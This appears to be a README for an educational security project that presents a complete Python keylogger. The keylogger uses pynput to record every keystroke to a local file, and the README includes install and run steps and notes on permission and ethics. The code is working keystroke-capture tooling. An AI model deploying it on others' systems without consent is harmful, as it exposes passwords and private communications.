# PRODIGY_CS_04
# Simple Keylogger

## Description

This project is a basic keylogger that records and logs keystrokes. It focuses on capturing and saving key presses to a file. The keylogger is implemented in Python using the `pynput` library. 

**Note:** Ethical considerations and explicit permissions are crucial when using keyloggers. This tool is intended for educational purposes only.

## Features

- Captures all key presses.
- Logs special keys in a readable format (e.g., space, enter, tab).
- Saves keystrokes to a file (`key_log.txt`).

## Requirements

- Python 3.x
- `pynput` library

## Installation

1. **Clone the Repository:**

   ```bash
   git clone https://github.com/raby02/PRODIGY_CS_04y.git
   ```
2. **Navigate to the Project Directory:**

   ```bash
   cd your-repository
   ```
3. **Install Required Packages:**
   Ensure you have pynput installed. You can install it using pip:
    ```bash
   pip install pynput
   ```

## Usage

### Run the Keylogger Script

To start the keylogger, run the following command in your terminal:

```bash
python simple_keylogger.py
```

## Code Explanation

The provided script listens for key presses and logs them to a file. Below is an overview of how the code functions:

```python
from pynput.keyboard import Listener

# Define the file where keystrokes will be saved
log_file = "key_log.txt"

# Function to format and write key logs
def on_press(key):
    try:
        # Convert key to string
        key_str = str(key).replace("'", "")
        
        # Log special keys in a readable format
        if key_str == 'Key.space':
            key_str = ' [SPACE] '
        elif key_str == 'Key.enter':
            key_str = ' [ENTER]\n'
        elif key_str == 'Key.tab':
            key_str = ' [TAB] '
        elif key_str == 'Key.backspace':
            key_str = ' [BACKSPACE] '
        elif 'Key' in key_str:
            key_str = f' [{key_str.replace("Key.", "").upper()}] '

        # Write to the log file
        with open(log_file, 'a') as file:
            file.write(key_str)
    
    except Exception as e:
        print(f"Error: {e}")

# Start listening for key presses
with Listener(on_press=on_press) as listener:
    listener.join()
```

## Ethical Considerations

- **Permissions**: Always obtain explicit permission before running keyloggers on any system. Unauthorized use of keyloggers is illegal and unethical.
- **Usage**: Use this tool responsibly and only for educational purposes or with the consent of all parties involved. Misuse of keyloggers can lead to legal consequences and privacy violations.





